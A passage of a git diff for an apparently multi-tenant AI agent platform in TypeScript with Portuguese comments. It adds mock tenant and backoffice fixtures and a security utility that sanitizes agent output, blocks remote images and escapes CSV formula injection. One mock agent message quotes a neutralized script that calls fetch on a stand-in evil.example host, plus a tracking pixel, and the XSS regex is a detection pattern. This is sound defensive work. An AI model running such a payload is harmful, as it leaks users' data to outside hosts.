++          "Detectei tentativa de injeção e rastreamento externo no documento bruto que foi neutralizada pela camada WEB-008:\n<script>fetch('https://evil.example/steal')</script>\n![pixel-rastreamento](https://tracker.evil.example/pixel.png?tenant=aurora)\nRecomendo manter apenas a minuta padrão com retenção de 30 dias.",
++        toolSteps: [
++          {
++            stepId: "stp-10",
++            toolName: "rag_search.clauses_dpa",
++            policyDecision: "ALLOW",
++            durationMs: 62,
++            summary: "Recuperação híbrida de cláusulas LGPD do tenant",
++          },
++        ],
++        citations: [
++          {
++            documentId: "doc-rag-02",
++            documentTitle: "Manual de Cláusulas Padrão DPA e Suboperadores LGPD.docx",
++            sectionLabel: "Cláusula 7 — Vedação de exfiltração e retenção",
++          },
++        ],
++        costTokens: 980,
++      },
++    ],
++  },
++];
++
++export function generateOrganizationUsageCsv(orgSlug: string): string {
++  const org = getMockOrganizationBySlug(orgSlug);
++  const rows: DepartmentUsageCsvRow[] = org.floors.flatMap((floor) =>
++    floor.agents.map((agent) => ({
++      organizationSlug: org.slug,
++      departmentName: floor.name,
++      moduleCode: floor.moduleCode,
++      agentName: agent.name,
++      modelName: agent.modelName,
++      tokensUsedMonth: agent.tokensUsedMonth,
++      tokensLimitMonth: agent.tokensLimitMonth,
++      monthlySpentBrl: floor.monthlySpentBrl,
++      monthlyBudgetBrl: floor.monthlyBudgetBrl,
++    })),
++  );
++  return buildOrganizationUsageCsv(rows);
++}
++
++const MOCK_PLATFORM_TENANTS: readonly MockPlatformTenantMetadata[] = [
++  {
++    tenantId: "tnt-01-aurora",
++    slug: "aurora-industrial",
++    state: "ACTIVE",
++    monthlyCostBrl: 11000,
++    monthlyCapBrl: 15000,
++    killSwitchActive: false,
++    reconcilerDrift: "NONE",
++    activeContainers: 4,
++  },
++  {
++    tenantId: "tnt-02-vereda",
++    slug: "vereda-logistica",
++    state: "PROVISIONING",
++    monthlyCostBrl: 1050,
++    monthlyCapBrl: 5000,
++    killSwitchActive: false,
++    reconcilerDrift: "NONE",
++    activeContainers: 2,
++  },
++  {
++    tenantId: "tnt-03-horizonte",
++    slug: "horizonte-saude",
++    state: "ACTIVE",
++    monthlyCostBrl: 3800,
++    monthlyCapBrl: 6000,
++    killSwitchActive: false,
++    reconcilerDrift: "NONE",
++    activeContainers: 4,
++  },
++  {
++    tenantId: "tnt-04-atlas",
++    slug: "atlas-energia",
++    state: "ACTIVE",
++    monthlyCostBrl: 8900,
++    monthlyCapBrl: 9000,
++    killSwitchActive: false,
++    reconcilerDrift: "MINOR_DRIFT",
++    activeContainers: 4,
++  },
++  {
++    tenantId: "tnt-05-vanguarda",
++    slug: "vanguarda-agro",
++    state: "SUSPENDED",
++    monthlyCostBrl: 0,
++    monthlyCapBrl: 4000,
++    killSwitchActive: true,
++    reconcilerDrift: "NONE",
++    activeContainers: 0,
++  },
++];
++
++const MOCK_PROVISIONING_RUNS: readonly MockProvisioningExecution[] = [
++  {
++    executionId: "PRV-2026-0042",
++    tenantSlug: "vereda-logistica",
++    currentStep: "Passo 4/5: Smoke de saúde da Tenant API e isolamento de rede",
++    status: "IN_PROGRESS",
++    stepsCompleted: 4,
++    totalSteps: 5,
++    updatedAtLabel: "há 2 min",
++  },
++  {
++    executionId: "PRV-2026-0041",
++    tenantSlug: "aurora-industrial",
++    currentStep: "Passo 5/5: Ativação concluída e reconciliador em conformidade",
++    status: "COMPLETED",
++    stepsCompleted: 5,
++    totalSteps: 5,
++    updatedAtLabel: "2026-10-25 11:00",
++  },
++];
++
++const MOCK_DLQ_ITEMS: readonly MockDlqItem[] = [
++  {
++    jobId: "dlq-job-9081",
++    tenantSlug: "atlas-energia",
++    queueName: "tenant.ai.completions",
++    failureCode: "OPENROUTER_UPSTREAM_502_EXHAUSTED",
++    retriesCount: 5,
++    occurredAtLabel: "há 19 min",
++  },
++  {
++    jobId: "dlq-job-9074",
++    tenantSlug: "aurora-industrial",
++    queueName: "tenant.webhooks.outbound",
++    failureCode: "EGRESS_TIMEOUT_AFTER_3_RETRIES",
++    retriesCount: 3,
++    occurredAtLabel: "há 1h 05min",
++  },
++];
++
++const MOCK_BREAK_GLASS_GRANTS: readonly MockBreakGlassGrant[] = [
++  {
++    grantId: "bg-2026-07",
++    tenantSlug: "atlas-energia",
++    requestedBy: "roberto.sre@nucleos-platform.example",
++    reason:
++      "Investigar alerta MINOR_DRIFT na cota de PIDs do container runtime sem acessar banco ou conversas.",
++    status: "ACTIVE_READONLY_METADATA",
++    expiresAtLabel: "Expira em 22 min (TTL máx 60 min)",
++  },
++];
++
++/**
++ * Resolve visao do Backoffice de Plataforma (/platform — WEB-009).
++ * Bloqueia com 403 qualquer ator que nao seja `platform_admin` com MFA verificado.
++ */
++export function resolvePlatformBackoffice(
++  actor: MockSessionActor | null,
++): PlatformBackofficeViewModel {
++  if (!actor || actor.platformRole !== "platform_admin" || !actor.mfaVerified) {
++    return {
++      allowed: false,
++      httpStatus: 403,
++      denialReason:
++        "Acesso negado (HTTP 403): A área /platform é exclusiva para operadores com papel platform_admin e MFA ativo. Usuários de tenant não possuem permissão.",
++      hostCapacity: {
++        vpsNodeLabel: "indisponivel",
++        activeTenantsCount: 0,
++        maxTenantsMvp: 5,
++        cpuUsagePct: 0,
++        ramUsedGb: 0,
++        ramTotalGb: 0,
++        diskUsedPct: 0,
++      },
++      tenants: [],
++      provisioningRuns: [],
++      dlqItems: [],
++      breakGlassGrants: [],
++    };
++  }
++
++  return {
++    allowed: true,
++    httpStatus: 200,
++    denialReason: null,
++    hostCapacity: {
++      vpsNodeLabel: "vps-mvp-saopaulo-01 (Isolamento Docker + Redes por Tenant)",
++      activeTenantsCount: 4,
++      maxTenantsMvp: 5,
++      cpuUsagePct: 58,
++      ramUsedGb: 19.4,
++      ramTotalGb: 32,
++      diskUsedPct: 44,
++    },
++    tenants: MOCK_PLATFORM_TENANTS,
++    provisioningRuns: MOCK_PROVISIONING_RUNS,
++    dlqItems: MOCK_DLQ_ITEMS,
++    breakGlassGrants: MOCK_BREAK_GLASS_GRANTS,
++  };
++}
 diff --git a/apps/web/lib/mock-fixtures.ts b/apps/web/lib/mock-fixtures.ts
 new file mode 100644
 index 0000000..276ee56
@@ -2179,6 +4196,191 @@ index 0000000..276ee56
 +    ],
 +  },
 +];
+diff --git a/apps/web/lib/mock-security.ts b/apps/web/lib/mock-security.ts
+new file mode 100644
+index 0000000..bd902a4
+--- /dev/null
++++ b/apps/web/lib/mock-security.ts
+@@ -0,0 +1,179 @@
++/**
++ * Utilitarios puros de seguranca do frontend e prevencao de duplicidade (WEB-002 e WEB-008).
++ *
++ * - Sanitizacao deterministica de texto/markdown vindo de agentes (sem dangerouslySetInnerHTML).
++ * - Bloqueio automatico de imagens remotas em respostas de agentes (evita exfiltracao por URL).
++ * - Guard de idempotencia contra duplo clique em mutacoes criticas.
++ * - Exportacao CSV de consumo de IA com neutralizacao de CSV Formula Injection.
++ */
++
++export interface SafeMessageSegment {
++  readonly kind: "text" | "code" | "safe_link" | "blocked_xss" | "blocked_remote_image";
++  readonly content: string;
++  readonly href?: string;
++}
++
++export interface SanitizedAgentOutput {
++  readonly safeSegments: readonly SafeMessageSegment[];
++  readonly blockedXssCount: number;
++  readonly blockedRemoteImages: readonly string[];
++}
++
++export interface DepartmentUsageCsvRow {
++  readonly organizationSlug: string;
++  readonly departmentName: string;
++  readonly moduleCode: string;
++  readonly agentName: string;
++  readonly modelName: string;
++  readonly tokensUsedMonth: number;
++  readonly tokensLimitMonth: number;
++  readonly monthlySpentBrl: number;
++  readonly monthlyBudgetBrl: number;
++}
++
++const XSS_PATTERN =
++  /<\s*\/?\s*(?:script|iframe|object|embed|svg|math|style|link|meta)\b[^>]*>|on[a-z]+\s*=|javascript\s*:|vbscript\s*:|data\s*:\s*text\/html/gi;
++
++const REMOTE_IMAGE_MARKDOWN_PATTERN = /!\[([^\]]*)\]\(\s*(https?:\/\/[^\s)]+)\s*\)/gi;
++
++const HTML_IMG_TAG_PATTERN = /<\s*img\b[^>]*\bsrc\s*=\s*["']?(https?:\/\/[^"'\s>]+)["']?[^>]*>/gi;
++
++/**
++ * Sanitiza conteudo emitido por agente antes da renderizacao em componentes React.
++ * Nunca produz HTML bruto; divide e neutraliza trechos maliciosos e imagens remotas.
++ */
++export function sanitizeAgentMessageContent(rawContent: string): SanitizedAgentOutput {
++  const blockedRemoteImages: string[] = [];
++  let working = rawContent;
++
++  working = working.replace(
++    REMOTE_IMAGE_MARKDOWN_PATTERN,
++    (_fullMatch, _alt: string, url: string) => {
++      blockedRemoteImages.push(url);
++      return `[IMAGEM_REMOTA_BLOQUEADA:${url}]`;
++    },
++  );
++
++  working = working.replace(HTML_IMG_TAG_PATTERN, (_fullMatch, url: string) => {
++    blockedRemoteImages.push(url);
++    return `[IMAGEM_REMOTA_BLOQUEADA:${url}]`;
++  });
++
++  const xssMatches = working.match(XSS_PATTERN);
++  const blockedXssCount = xssMatches ? xssMatches.length : 0;
++
++  if (blockedXssCount > 0) {
++    working = working.replace(XSS_PATTERN, "[CONTEUDO_ATUADO_POR_POLITICA_XSS]");
++  }
++
++  const lines = working.split("\n");
++  const safeSegments: SafeMessageSegment[] = [];
++
++  for (const line of lines) {
++    if (line.includes("[IMAGEM_REMOTA_BLOQUEADA:")) {
++      safeSegments.push({
++        kind: "blocked_remote_image",
++        content: line,
++      });
++    } else if (line.includes("[CONTEUDO_ATUADO_POR_POLITICA_XSS]")) {
++      safeSegments.push({
++        kind: "blocked_xss",
++        content: line,
++      });
++    } else if (line.trim().startsWith("`") && line.trim().endsWith("`")) {
++      safeSegments.push({
++        kind: "code",
++        content: line.trim().slice(1, -1),
++      });
++    } else {
++      safeSegments.push({
++        kind: "text",
++        content: line,
++      });
++    }
++  }
++
++  return {
++    safeSegments,
++    blockedXssCount,
++    blockedRemoteImages,
++  };
++}
++
++/**
++ * Gera chave deterministica de idempotencia para mutacoes da UI (WEB-002).
++ */
++export function createIdempotencyKey(scope: string, targetId: string, action: string): string {
++  const normalized = `${scope.trim()}:${targetId.trim()}:${action.trim()}`
++    .toLowerCase()
++    .replace(/[^a-z0-9:_-]/g, "-");
++  return `idem-${normalized}`;
++}
++
++export interface IdempotencyCheckResult {
++  readonly allowed: boolean;
++  readonly idempotencyKey: string;
++  readonly updatedKeys: readonly string[];
++}
++
++export function registerIdempotentMutation(
++  existingKeys: readonly string[],
++  scope: string,
++  targetId: string,
++  action: string,
++): IdempotencyCheckResult {
++  const key = createIdempotencyKey(scope, targetId, action);
++  if (existingKeys.includes(key)) {
++    return {
++      allowed: false,
++      idempotencyKey: key,
++      updatedKeys: existingKeys,
++    };
++  }
++  return {
++    allowed: true,
++    idempotencyKey: key,
++    updatedKeys: [...existingKeys, key],
++  };
++}
++
++function escapeCsvCell(value: string | number): string {
++  const raw = String(value);
++  // Previne CSV Formula Injection (=, +, -, @, tab, CR no inicio da celula)
++  const neutralized = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
++  const escaped = neutralized.replace(/"/g, '""');
++  return `"${escaped}"`;
++}
++
++/**
++ * Exporta o relatorio de consumo de IA da organizacao em formato CSV seguro (WEB-003).
++ */
++export function buildOrganizationUsageCsv(rows: readonly DepartmentUsageCsvRow[]): string {
++  const header = [
++    "organizacao",
++    "departamento",
++    "modulo",
++    "agente",
++    "modelo",
++    "tokens_usados_mes",
++    "tokens_limite_mes",
++    "gasto_mensal_brl",
++    "orcamento_mensal_brl",
++  ].join(",");
++
++  const bodyLines = rows.map((row) =>
++    [
++      escapeCsvCell(row.organizationSlug),
++      escapeCsvCell(row.departmentName),
++      escapeCsvCell(row.moduleCode),
++      escapeCsvCell(row.agentName),
++      escapeCsvCell(row.modelName),
++      escapeCsvCell(row.tokensUsedMonth),
++      escapeCsvCell(row.tokensLimitMonth),
++      escapeCsvCell(row.monthlySpentBrl),
++      escapeCsvCell(row.monthlyBudgetBrl),
++    ].join(","),
++  );
++
++  return [header, ...bodyLines].join("\n");
++}
 diff --git a/apps/web/lib/mock-selectors.ts b/apps/web/lib/mock-selectors.ts
 new file mode 100644
 index 0000000..830c4ce
